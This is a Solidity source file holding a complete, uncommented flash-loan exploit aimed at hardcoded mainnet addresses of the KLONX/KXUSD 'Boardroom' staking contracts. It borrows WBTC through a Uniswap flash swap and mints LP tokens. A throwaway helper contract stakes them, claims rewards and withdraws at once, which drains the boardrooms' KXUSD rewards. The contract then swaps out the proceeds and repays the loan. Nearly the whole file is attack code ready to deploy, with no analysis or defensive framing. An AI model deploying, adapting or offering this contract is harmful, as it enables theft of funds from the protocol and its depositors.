// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapBoardroom {
    struct PoolRewardSnapshot {
        uint256 timestamp;
        uint256 addedSyntheticReward;
        uint256 accruedRewardPerShareUnit;
    }

    function poolRewardSnapshots(address, uint) external returns(PoolRewardSnapshot memory poolInfo);

    function stake(address to, uint256 amount) external;

    function claimRewards(address to) external;

    function withdraw(address to, uint256 amount) external;
}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}

interface IUniswapRouter {
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Pair {
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}


contract Luck {
    using SafeMath for uint256;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant KXUSD = 0x43244C686a014C49D3D5B8c4b20b4e3faB0cbDA7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant KLONX = 0xbf15797BB5E47F6fB094A4abDB2cfC43F77179Ef;
    address private constant UniBoardroom = 0xd5b0AE8003B24ECF232d434A5f098ea821Cf8aE3;
    address private constant LiquidBoardroom = 0xAcbdB82f07B2653137d3A08A22637121422ae747;
    address private constant WBTC_KLONX_LP = 0x69Cda6eDa9986f7fCa8A5dBa06c819B535F4Fc50;
    address private constant WBTC_WETH_LP = 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940;
    address private constant UniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    function good_luck() external {
        IUniswapBoardroom.PoolRewardSnapshot memory poolInfo = IUniswapBoardroom(UniBoardroom).poolRewardSnapshots(KXUSD, 8);

        IUniswapBoardroom.PoolRewardSnapshot memory last_poolInfo = IUniswapBoardroom(UniBoardroom).poolRewardSnapshots(KXUSD, 0);

        uint256 lp_need = IERC20(KXUSD).balanceOf(UniBoardroom) / 
            ((poolInfo.accruedRewardPerShareUnit - last_poolInfo.accruedRewardPerShareUnit) / 1e18);

        (uint256 _r0, uint256 _r1, ) = IUniswapV2Pair(WBTC_KLONX_LP).getReserves();

        uint256 _totalSupply = IUniswapV2Pair(WBTC_KLONX_LP).totalSupply();
        uint256 amount1Out = lp_need * _r1 / (lp_need + _totalSupply);
        uint256 amt_in = amount1Out * _r0 * 1000 / (_r1 - amount1Out) / 997;
        uint256 t0_need = lp_need.mul(_r0 + amt_in) / _totalSupply;

        uint256 borrow_amt = t0_need + amt_in + 11000;
        bytes memory data = abi.encode(amount1Out, amt_in, borrow_amt * 1000 / 997);
        IUniswapV2Pair(WBTC_WETH_LP).swap(borrow_amt, 0, address(this), data);
    }


    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        (uint256 t1_need, uint256 amt_in, uint256 repay_amt) = abi.decode(data, (uint256, uint256, uint256));
        
        IERC20(WBTC).transfer(WBTC_KLONX_LP, amt_in+1);
        IUniswapV2Pair(WBTC_KLONX_LP).swap(0, t1_need, address(this), "");

        IERC20(WBTC_KLONX_LP).approve(UniBoardroom, type(uint256).max);
        // mint Lps
        IERC20(WBTC).transfer(WBTC_KLONX_LP, IERC20(WBTC).balanceOf(address(this)));
        IERC20(KLONX).transfer(WBTC_KLONX_LP, IERC20(KLONX).balanceOf(address(this)));
        uint256 lp_amt = IUniswapV2Pair(WBTC_KLONX_LP).mint(address(this));

        Luck2 l2 = new Luck2();

        IUniswapBoardroom(UniBoardroom).stake(address(l2), lp_amt * 99 / 100);
        l2.claim(UniBoardroom, lp_amt * 99 / 100);

        IERC20(WBTC_KLONX_LP).transfer(WBTC_KLONX_LP, lp_amt);
        IUniswapV2Pair(WBTC_KLONX_LP).burn(address(this));

        IERC20(KLONX).approve(LiquidBoardroom, type(uint256).max);

        IUniswapBoardroom.PoolRewardSnapshot memory poolInfo = IUniswapBoardroom(LiquidBoardroom).poolRewardSnapshots(KXUSD, 8);
        IUniswapBoardroom.PoolRewardSnapshot memory last_poolInfo = IUniswapBoardroom(LiquidBoardroom).poolRewardSnapshots(KXUSD, 0);

        uint256 stake_amt = IERC20(KXUSD).balanceOf(LiquidBoardroom) / 
            ((poolInfo.accruedRewardPerShareUnit - last_poolInfo.accruedRewardPerShareUnit) / 1e18) * 60 / 100;

        IUniswapBoardroom(LiquidBoardroom).stake(address(l2), stake_amt);
        l2.claim(LiquidBoardroom, stake_amt);

        address[] memory path = new address[](2);
        path[0] = KLONX;
        path[1] = WBTC;
        IERC20(KLONX).approve(UniRouter, type(uint256).max);
        IUniswapRouter(UniRouter).swapExactTokensForTokens(IERC20(KLONX).balanceOf(address(this)), 0, path, address(this), block.timestamp);

        address[] memory path1 = new address[](3);
        path1[0] = KXUSD;
        path1[1] = DAI;
        path1[2] = WETH;
        IERC20(KXUSD).approve(UniRouter, type(uint256).max);
        IUniswapRouter(UniRouter).swapExactTokensForTokens(IERC20(KXUSD).balanceOf(address(this)), 0, path1, address(this), block.timestamp);

        uint256 wbtc_bal = IERC20(WBTC).balanceOf(address(this));
        (uint256 _r0, uint256 _r1,) = IUniswapV2Pair(WBTC_WETH_LP).getReserves();
        uint256 repay_weth = IUniswapRouter(UniRouter).getAmountIn(repay_amt - wbtc_bal, _r1, _r0);
        IERC20(WBTC).transfer(WBTC_WETH_LP, wbtc_bal);
        IERC20(WETH).transfer(WBTC_WETH_LP, repay_weth);
    }
}

contract Luck2 {
    function claim(address _u, uint256 _amt) external {
        IUniswapBoardroom(_u).claimRewards(msg.sender);
        IUniswapBoardroom(_u).withdraw(msg.sender, _amt);
    }
}
